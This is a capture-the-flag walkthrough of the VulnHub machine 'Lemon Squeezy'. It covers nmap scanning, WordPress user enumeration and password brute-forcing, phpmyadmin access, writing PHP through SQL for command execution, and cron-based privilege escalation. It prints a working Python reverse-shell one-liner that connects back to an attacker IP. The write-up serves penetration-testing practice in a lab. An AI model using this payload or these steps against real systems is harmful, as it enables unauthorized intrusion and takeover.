# VulnHub-Lemon Squeezy

## NMAP

```
nmap -sC -sV 172.16.6.128
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-25 05:47 PKT
Nmap scan report for 172.16.6.128
Host is up (0.00026s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 00:0C:29:BF:8A:DB (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.85 seconds

```

## PORT 80

<img src="https://imgur.com/3e3R2a3.png"/>


Running gobuster

<img src="https://imgur.com/ohut5DK.png"/>

We see that there's a wordpress directory and if you visit it css would not be rendered properly because it is using the domain name `lemonsqueezy` so put it in the `/etc/hosts` file

<img src="https://imgur.com/DNCzW3g.png"/>

<img src="https://imgur.com/TlT6WQg.png"/>

Since this is a wordpress site we can use wpscan to look for users

<img src="https://imgur.com/G26pGbt.png"/>

<img src="https://imgur.com/QOZdxRN.png"/>

Bruteforcing against these users

<img src="https://imgur.com/74gtYPG.png"/>

<img src="https://imgur.com/joxGmka.png"/>

<img src="https://imgur.com/rgNaNQf.png"/>

<img src="https://imgur.com/ZGbCvaa.png"/>

<img src="https://imgur.com/S0UFhtb.png"/>

<img src="https://imgur.com/Gt60xxp.png"/>

We know that there's another usernamed `lemon` maybe this is his passowrd for wordpress or phpmyadmin so let's try logging in with this

<img src="https://imgur.com/74oyBnN.png"/>

This was the password for orange to phpmyadmin

Insert a simple GET paramter php code to execute system commands through SQL

<img src="https://imgur.com/lFP3V6t.png"/>

<img src="https://imgur.com/14vCJfQ.png"/>



```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.43.129",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Through this payload we get a reverse shell and I stabilized it with by spawning a shell with python also I looked at cronjobs running and there is a script running as root

<img src="https://imgur.com/qzGtQZd.png"/>

<img src="https://imgur.com/Qllpyik.png"/>

<img src="https://imgur.com/SuBS4mO.png"/>

This didnt work so I used the python reverse shell payload again

<img src="https://imgur.com/koX6v9M.png"/>

<img src="https://imgur.com/sQVe4Z7.png"/>